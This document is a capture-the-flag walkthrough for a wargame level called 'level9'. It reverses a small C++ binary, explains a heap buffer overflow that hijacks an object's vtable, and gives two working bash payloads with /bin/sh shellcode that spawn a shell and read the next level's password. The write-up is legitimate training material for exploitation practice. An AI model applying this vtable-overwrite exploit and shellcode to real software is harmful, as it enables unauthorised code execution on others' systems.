# Walkthrough

## Reversing

Oh... This is in C++... Cool!

```cpp

void main(int argc,char **argv)
{
  N *a;
  N *b;
  
  if (argc < 2) {
    _exit(1);
  }
  a = (N *)operator.new(108);
  N::N(a,5);
  b = (N *)operator.new(108);
  N::N(b,6);
  N::setAnnotation(a,argv[1]);
  (***(code ***)b)(b,a);
  return;
}

void __thiscall N::N(N *this,int param_1)
{
  *(undefined ***)this = &PTR_operator+_08048848;
  *(int *)(this + 0x68) = param_1;
  return;
}

int __thiscall N::operator+(N *this,N *param_1)
{
  return *(int *)(param_1 + 104) + *(int *)(this + 104);
}

int __thiscall N::operator-(N *this,N *param_1)
{
  return *(int *)(this + 104) - *(int *)(param_1 + 104);
}

void __thiscall N::setAnnotation(N *this,char *param_1)
{
  size_t __n;
  
  __n = strlen(param_1);
  memcpy(this + 4,param_1,__n);
  return;
}
```

Is a very simple binary, I was hopping for something more complex when I saw it
was on C++... But okey, I understand this project is entry-level.

## Exploit

The `setAnnotation` method is vulnerable to buffer overflow, it copies with out
making any check, and, because the `this_00` class is allocated after `this`,
it will be just after in the heap, so we can overwrite the `this_00` memory
region.

But, what's happening in this line exactly? `(***(code ***)b)(b,a);` It's
dereferencing twice?.

In c++, usually, the first bytes of a class is the `vtable` pointer, that's
why `setAnnotation` copy to `this + 4`, it skips this pointers, and I suppose
there is later an attribute, probably a `std::string`.

So, in that line, is calling the function at `vtable[0]`, so now look at the
vtable:
```raw
                     **************************************************************
                     * vtable for N                                               *
                     **************************************************************
                     _ZTV1N                                          XREF[1]:     Entry Point(*)  
                     N::vtable
08048840 00              ??         00h
08048841 00              ??         00h
08048842 00              ??         00h
08048843 00              ??         00h
08048844 54 88 04 08     addr       N::typeinfo                                      = 08049b88
                     PTR_operator+_08048848                          XREF[1]:     N:080486fc(*)  
08048848 3a 87 04 08     addr       N::operator+
0804884c 4e 87 04 08     addr       N::operator-
```

So indeed, that first function is the `operator+`, cool right? This will be
useful when recoding the source, but for now, it doesn't matter, what does
matter is that we now that whatever we place in `b` will be dereferenced, and
the dereferenced address will be again dereferenced, so our payload is gonna
be fun.

For now, let's get the addresses of the allocated classes using gdb, search
in the source for the `operatorn.new` address or the compiled name, because
it will be something strange, in my case it was: `_Znwj@@GLIBCXX_3.4`.

Place breakpoints after, and check `$eax`, the usual stuff:
```raw
0x0804a008
0x0804a078
```

The offset is:
```raw
0x0804a008h - 0x0804a078h = 112d
```

So, the offset will be:
- `108` bytes of the allocation size (for the class).
- `4` bytes of offset between allocations.
- `-4` bytes because `setAnnotation` starts writing at `this + 4`.

So our payload will be:

- `108` offset bytes.
- address pointing to shellcode address (`0804a078 + 4 = 0804a07c`) (It will be dereferenced).
- shellcode address (`0804a078 + 4 + 4 = 0804a080`) (Because it will dereference twice).
- Our [shellcode from shell-storm](https://shell-storm.org/shellcode/files/shellcode-752.html).

```bash
offset=$(printf "%108s" " " | tr ' ' 'A')
addr1=$(printf '\x7c\xa0\x04\x08')
addr2=$(printf '\x80\xa0\x04\x08')
sc=$(printf '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80')

payload="${offset}${addr1}${addr2}${sc}"
./level9 "${payload}"

cd /home/user/bonus0
cat .pass
```

And that's it! Flag obtained! Of course, check the `./resources/exploit.sh`. ;D

Another option would be to add the shellcode to the offset instead, this has the
advantage of a smaller final payload:
- Address of shellcode (`0804a008 + 8 = 0804a010`, because our buffer starts in `this + 4`).
- Shellcode (23 bytes).
- Offset (4 + 23 = 27, 108 - 27 = 81)
- Address of address of shellcode (`0804a008 + 4 = 0804a00c`)

```bash
addr1=$(printf '\x10\xa0\x04\x08')
sc=$(printf '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80')
offset=$(printf "%83s" " " | tr ' ' 'A')
addr2=$(printf '\x0c\xa0\x04\x08')

payload="${addr1}${sc}${offset}${addr2}"
./level9 "${payload}"
```

So... bonus time? `\(^O^)/ <( Let's go! )`
